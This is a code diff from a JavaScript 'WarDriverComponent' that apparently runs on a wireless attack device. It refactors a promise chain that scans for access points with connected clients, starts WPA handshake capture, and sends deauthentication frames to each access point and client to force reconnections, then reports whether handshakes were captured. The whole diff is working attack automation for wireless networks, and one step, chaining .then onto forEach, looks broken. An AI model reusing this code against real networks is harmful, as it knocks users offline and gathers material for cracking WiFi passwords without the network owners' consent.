@@ -759,49 +759,48 @@
             var currentClient;
             getReconStatus().then(function (reconResp) {
                 if (reconResp.scanRunning) { // if recon is running, stop it
-                    stopRecon().then(function () {
-                        setSettings().then(function () {
-                            startRecon().then(function (startResp) {
-                                if (startResp.scanRunning) {
-                                    scanID = startResp.scanID;
-                                    setTimeout(function () {
-                                        stopRecon().then(function (stopReconResponse) {
-                                            if (stopReconResponse.success) {
-                                                getReconStatusById(scanID).then(function (reconScanResults) {
-                                                    if (reconScanResults.APResults.length > 0) { // if we picked-up any APs
-                                                        reconScanResults.APResults.forEach(function (ap) {
-                                                            if (ap.clients.length > 0) { // if any have clients
-                                                                currentBssid = ap.bssid;
-                                                                startHandshakeCapture(ap.bssid).then(function () {
-                                                                    deauthBssid(ap);
-                                                                    ap.clients.forEach(function (client) {
-                                                                        currentClient = client;
-                                                                        deauthClient(client);
-                                                                    }).then(function () {
-                                                                        setTimeout(function () {
-                                                                            getHandshakeStatus().then(function (handShakeStatus) {
-                                                                                if (handShakeStatus.handshakes != null) {
-                                                                                    sendNotification('Handshakes Found!'); // tell the user our results
-                                                                                }
-                                                                                else {
-                                                                                    sendNotification('Sorry, no handshakes found :(');
-                                                                                }
-                                                                            });
-                                                                        }, 20000);
+                    stopRecon();
+                }
+                setSettings().then(function () {
+                    startRecon().then(function (startResp) {
+                        if (startResp.scanRunning) {
+                            scanID = startResp.scanID;
+                            setTimeout(function () {
+                                stopRecon().then(function (stopReconResponse) {
+                                    if (stopReconResponse.success) {
+                                        getReconStatusById(scanID).then(function (reconScanResults) {
+                                            if (reconScanResults.APResults.length > 0) { // if we picked-up any APs
+                                                reconScanResults.APResults.forEach(function (ap) {
+                                                    if (ap.clients.length > 0) { // if any have clients
+                                                        currentBssid = ap.bssid;
+                                                        startHandshakeCapture(ap.bssid).then(function () {
+                                                            deauthBssid(ap);
+                                                            ap.clients.forEach(function (client) {
+                                                                currentClient = client;
+                                                                deauthClient(client);
+                                                            }).then(function () {
+                                                                setTimeout(function () {
+                                                                    getHandshakeStatus().then(function (handShakeStatus) {
+                                                                        if (handShakeStatus.handshakes != null) {
+                                                                            sendNotification('Handshakes Found!'); // tell the user our results
+                                                                        }
+                                                                        else {
+                                                                            sendNotification('Sorry, no handshakes found :(');
+                                                                        }
                                                                     });
-                                                                });
-                                                            }
+                                                                }, 20000);
+                                                            });
                                                         });
                                                     }
                                                 });
                                             }
                                         });
-                                    }, 31000);
-                                }
-                            });
-                        });
+                                    }
+                                });
+                            }, 31000);
+                        }
                     });
-                }
+                });
             });
         };
         WarDriverComponent.ctorParameters = function () { return [
